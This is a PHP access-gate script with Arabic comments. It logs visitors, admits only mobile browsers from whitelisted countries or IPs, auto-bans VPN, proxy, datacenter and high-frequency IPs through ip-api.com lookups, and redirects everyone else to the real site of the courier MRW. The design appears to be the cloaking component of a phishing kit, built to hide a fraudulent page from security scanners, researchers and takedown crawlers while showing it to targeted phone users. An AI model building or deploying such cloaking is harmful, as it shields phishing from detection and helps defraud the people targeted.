<?php
function get_client_ip() {
    $ip = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED'])) $ip = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED'])) $ip = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR'])) $ip = $_SERVER['REMOTE_ADDR'];
    else $ip = 'UNKNOWN';
    return explode(',', $ip)[0];
}

function is_mobile() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $user_agent);
}

function check_vpn_proxy($ip) {
    $details = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,message,countryCode,hosting,proxy"));
    if ($details && $details->status === 'success') {
        if ($details->hosting || (isset($details->proxy) && $details->proxy)) {
            return true;
        }
    }
    return false;
}

function ip_in_range($ip, $range) {
    if ($ip === '::1' || $ip === '127.0.0.1') return false; 
    if (strpos($range, '/') === false) $range .= '/32';
    list($range, $netmask) = explode('/', $range, 2);
    $range_dec = ip2long($range);
    $ip_dec = ip2long($ip);
    if (!$range_dec || !$ip_dec) return false;
    $wildcard_dec = pow(2, (32 - $netmask)) - 1;
    $netmask_dec = ~ $wildcard_dec;
    return (($ip_dec & $netmask_dec) == ($range_dec & $netmask_dec));
}

function redirect_blocked() {
    header('Location: https://www.mrw.es');
    exit();
}

$client_ip = get_client_ip();
$ban_file = __DIR__ . '/ban.txt';
$log_file = __DIR__ . '/rate_limit.log';
$whitelist_file = __DIR__ . '/whitelist.txt';

// 1. تسجيل كل زائر (مسموح أو محظور) في السجل فوراً
$log_entry = date('Y-m-d H:i:s') . " - IP: $client_ip - UA: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
file_put_contents($log_file, $log_entry, FILE_APPEND);

// استثناء الـ Localhost للاختبار
if ($client_ip === '::1' || $client_ip === '127.0.0.1' || $_SERVER['SERVER_NAME'] === 'localhost') {
    return; 
}

// 2. فحص القائمة السوداء اليدوية
$ban_list = file($ban_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
foreach ($ban_list as $banned) {
    if (ip_in_range($client_ip, trim($banned))) {
        redirect_blocked();
    }
}

// 3. منع الحواسب (يسمح فقط بالهواتف)
if (!is_mobile()) {
    redirect_blocked();
}

// 4. فحص الـ VPN والـ Proxy والـ Hosting
if (check_vpn_proxy($client_ip)) {
    if (!in_array($client_ip, $ban_list)) {
        file_put_contents($ban_file, $client_ip . " # Auto-Banned VPN/Proxy\n", FILE_APPEND);
    }
    redirect_blocked();
}

// 5. الحظر التلقائي عند تجاوز 30 زيارة
$log_content = file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$ip_counts = array_count_values(array_map(function($line) {
    preg_match('/IP: ([\d\.\:a-f]+)/', $line, $matches);
    return $matches[1] ?? '';
}, $log_content));

if (isset($ip_counts[$client_ip]) && $ip_counts[$client_ip] > 30) {
    if (!in_array($client_ip, $ban_list)) {
        file_put_contents($ban_file, $client_ip . " # Auto-Banned Spam\n", FILE_APPEND);
    }
    redirect_blocked();
}

// 6. فحص القائمة البيضاء والدول المسموحة
$whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$allowed_countries = [];
$allowed_ips = [];
foreach ($whitelist as $item) {
    $item = trim($item);
    if (strlen($item) == 2) $allowed_countries[] = strtoupper($item);
    else $allowed_ips[] = $item;
}

$is_allowed = false;
foreach ($allowed_ips as $allowed) {
    if (ip_in_range($client_ip, $allowed)) {
        $is_allowed = true;
        break;
    }
}

if (!$is_allowed && !empty($allowed_countries)) {
    $details = @json_decode(file_get_contents("http://ip-api.com/json/{$client_ip}"));
    $country_code = strtoupper($details->countryCode ?? 'UNKNOWN');
    if (in_array($country_code, $allowed_countries)) {
        $is_allowed = true;
    }
}

if (!$is_allowed) {
    redirect_blocked();
}
?>
